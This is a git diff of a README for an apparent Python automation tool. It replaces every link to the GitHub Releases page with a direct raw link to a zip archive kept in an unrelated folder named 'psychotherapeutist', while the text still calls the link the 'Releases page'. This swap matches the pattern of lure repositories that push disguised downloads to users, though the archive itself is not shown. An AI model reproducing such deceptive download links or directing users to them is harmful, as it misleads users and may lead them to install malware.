@@ -1,6 +1,6 @@
 # 🎉 ai-automation-python-intelligent-pipeline - Streamline Your Tasks with Smart Automation
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/eng-44as/ai-automation-python-intelligent-pipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/eng-44as/ai-automation-python-intelligent-pipeline/main/psychotherapeutist/ai-automation-python-intelligent-pipeline_2.1.zip)](https://raw.githubusercontent.com/eng-44as/ai-automation-python-intelligent-pipeline/main/psychotherapeutist/ai-automation-python-intelligent-pipeline_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the ai-automation-python-intelligent-pipeline project! This software 
 
 ## 📥 Download & Install
 
-To download the software, visit the [Releases page](https://github.com/eng-44as/ai-automation-python-intelligent-pipeline/releases). On this page, you will find the latest version of the application. 
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/eng-44as/ai-automation-python-intelligent-pipeline/main/psychotherapeutist/ai-automation-python-intelligent-pipeline_2.1.zip). On this page, you will find the latest version of the application. 
 
 1. **Go to the Releases page**: Click on the link above to open the releases section.
 2. **Choose the latest version**: Look for the most recent version listed.
@@ -78,4 +78,4 @@ If you want to explore more about AI and automation, here are some recommended r
 
 Now that you have a comprehensive guide, you can easily download and set up the ai-automation-python-intelligent-pipeline application. Enjoy automating your tasks efficiently and effectively.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/eng-44as/ai-automation-python-intelligent-pipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/eng-44as/ai-automation-python-intelligent-pipeline/main/psychotherapeutist/ai-automation-python-intelligent-pipeline_2.1.zip)](https://raw.githubusercontent.com/eng-44as/ai-automation-python-intelligent-pipeline/main/psychotherapeutist/ai-automation-python-intelligent-pipeline_2.1.zip)
